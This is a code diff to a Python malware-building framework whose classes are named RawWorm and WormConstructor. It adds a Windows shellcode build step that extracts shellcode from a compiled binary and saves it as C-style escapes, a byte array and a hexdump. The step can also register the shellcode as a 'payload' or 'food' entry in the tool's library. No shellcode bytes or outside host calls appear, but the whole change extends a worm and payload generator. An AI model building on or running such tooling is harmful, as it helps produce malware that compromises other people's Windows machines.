@@ -2,6 +2,7 @@ import os
 import shutil
 from typing import Union, Callable
 from jinja2 import Template
+from pathlib import Path
 
 from .tools.external_script import ExternalModules
 from .tools.master_wrapper import MasterWrapper
@@ -85,6 +86,13 @@ class RawWorm:
 
         # include files (sfile module)
         self.include_files = self.wc.worm_builder.raw_worm.sfiles.copy()
+
+        # link to bin file for shellcode
+        self.bin_file_path = None
+
+        # shellcode
+        self.mem_shellcode = None
+        self.mem_shellcode_len = 0
         
     
     @property
@@ -324,6 +332,7 @@ class WormConstructor:
         # library
         self.Lib = self.coder.queen.Lib
         self.DIR_PAYLOAD = self.Lib.DIR_PAYLOAD
+        self.DIR_FOOD = self.Lib.DIR_FOOD
     
     def _default_options(self) -> dict:
         conf = {}
@@ -455,6 +464,8 @@ class WormConstructor:
                 return self.step_build_library
             case "CODE_LOADER":
                 return self.step_build_mod_loader
+            case "WIN_SHELLCODE":
+                return self.step_build_wscode
             case _:
                 return self.step_empty
     
@@ -482,8 +493,8 @@ class WormConstructor:
         return raw
     
     def step_add_imports(self, raw: RawWorm) -> RawWorm:
-        imp = "\n".join(self.coder.imports)
-        raw.code = imp + "\n" + raw.code
+        # imp = "\n".join(self.coder.imports)
+        # raw.code = imp + "\n" + raw.code
         return raw
     
     def step_build_mod_loader(self, raw: RawWorm) -> RawWorm:
@@ -833,6 +844,112 @@ class WormConstructor:
             raw.last_error = 1
         return raw
 
+
+##################### BUILD WINDOWS SHELLCODE ############################################
+    def step_build_wscode(self, raw: RawWorm) -> RawWorm:
+        self.msg("msg", "Builiding and extract shellcode.....", sender=self.name)
+        if raw.gvar.get("NO_COMPILE"):
+            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
+            return raw
+        raw = self.master.build_shellcode(raw)
+        # check bin file
+        if not os.path.exists(raw.bin_file_path):
+            self.msg("error", f"[!!] ERROR: Cant extract shellcode", sender=self.name)
+            raw.last_error = 1
+            return raw
+        raw = self.shellcode_asm_types(raw)
+        make_food = raw.gvar.get("MAKE_FOOD")
+        if make_food == True or make_food == "True":
+            finfo = raw.gvar.get("FOOD_INFO")
+            raw = self.make_food_var(raw, finfo)
+        make_payload = raw.gvar.get("MAKE_PAYLOAD")
+        if make_payload == True or make_payload == "True":
+            pinfo = raw.gvar.get("PAYLOAD_INFO")
+            raw = self.make_scode_as_payload(raw, pinfo)
+        # save shellcode
+        sdata = self._load_bytes(raw.bin_file_path)
+
+        # /x01 /xa3 format ( C-style string escapes )
+        data = "".join(f"\\x{byte:02x}" for byte in sdata)
+        fpath = os.path.join(raw.work_dir, f"{raw.name}_shellcode_string_escape.txt")
+        self._save_shellcode(fpath, data)
+
+        # 0x01, 0xA3 format ( C-array / byte array )
+        data = ", ".join(f"0x{byte:02x}" for byte in sdata)
+        fpath = os.path.join(raw.work_dir, f"{raw.name}_shellcode_byte_array.txt")
+        self._save_shellcode(fpath, data)
+
+        # 31c05068b8 format ( Hex-dump )
+        fpath = os.path.join(raw.work_dir, f"{raw.name}_shellcode_hexdump.txt")
+        data = "".join(f"{byte:02x}" for byte in sdata)
+        self._save_shellcode(fpath, data)
+
+        self.msg("msg", f"Shellcode length: {len(sdata)} bytes.", sender=self.name)
+        self.msg("msg", f"Save shellcode. Check '{raw.work_dir}' directory.", sender=self.name)
+        return raw
+    
+    def _save_shellcode(self, fpath: str, data: Union[bytes, str]) -> None:
+        try:
+            with open(fpath, "w") as file:
+                file.write(data)
+        except Exception as e:
+            self.msg("error", f"[!!] ERROR writing shellcode: {e} [!!]")
+
+    
+    def shellcode_asm_types(self, raw: RawWorm) -> RawWorm:
+        data = self._load_bytes(raw.bin_file_path)
+        if not data:
+            raw.last_error = 1
+            return raw
+        raw.mem_shellcode =  ", ".join(f"0x{b:02x}" for b in data)
+        raw.mem_shellcode_len = len(data)
+        return raw
+
+    def _load_bytes(self, fpath: str) -> Union[bytes, None]:
+        rbin = Path(fpath)
+        try:
+            return rbin.read_bytes()
+        except Exception as e:
+            self.msg("error", f"[!!] ERROR reading bytes: {e} [!!]", sender=self.name)
+            return None
+
+
+######################################## MAKE FOOD VARIABLE #################################################
+    def make_food_var(self, raw:RawWorm, info: str = None) -> RawWorm:
+        if not info:
+            info = ""
+        headers = f"#!name##{raw.name}\n#!types##food\n#!info##{info} Shellcode created by you. Shellcode length: {raw.mem_shellcode_len} bytes.\n#!load##shellcode\n#!system_FLAG##[W]\n"
+        empty = "\n\n"
+        fpath = os.path.join(self.DIR_FOOD, f"{raw.name}.data")
+        if os.path.exists(fpath):
+            self.msg("msg", f"[!!] WARNING: Food name: {raw.name} exists. It will be replaced by a new one. [!!]", sender=self.name)
+        try:
+            with open(fpath, "w") as file:
+                file.write(headers + empty + raw.mem_shellcode)
+        except Exception as e:
+            self.msg("error", f"[!!] ERROR: builidng Food Variable: {e} [!!]", sender=self.name)
+            return raw
+        self.msg("msg", f"Make Food Variable: '{raw.name}' successfull. You can find it in Food section.", sender=self.name)
+        return raw
+
+#################################### MAKE SHELLCODE AS PAYLOAD ################################################
+    def make_scode_as_payload(self, raw: RawWorm, info: str = None) -> RawWorm:
+        if not info:
+            info = ""
+        headers = f"#!name##{raw.name}\n#!types##payload\n#!info##{info} Shellcode created by you. Shellcode length: {raw.mem_shellcode_len} bytes.\n"
+        headers += "#!system_FLAG##[W]\n#!TAGS##[SCode]\n"
+        empty = "\n\n"
+        fpath = os.path.join(self.DIR_PAYLOAD, f"{raw.name}.data")
+        if os.path.exists(fpath):
+            self.msg("msg", f"[!!] WARNING: Payload name: {raw.name} exists. It will be replaced by a new one. [!!]", sender=self.name)
+        try:
+            with open(fpath, "w") as file:
+                file.write(headers + empty + raw.mem_shellcode)
+        except Exception as e:
+            self.msg("error", f"[!!] ERROR: builidng Payload: {e} [!!]", sender=self.name)
+            return raw
+        self.msg("msg", f"Make Payload '{raw.name}' successfull. You can find it in Payload section.")
+        return raw
 
 ##############################################################################################################
 
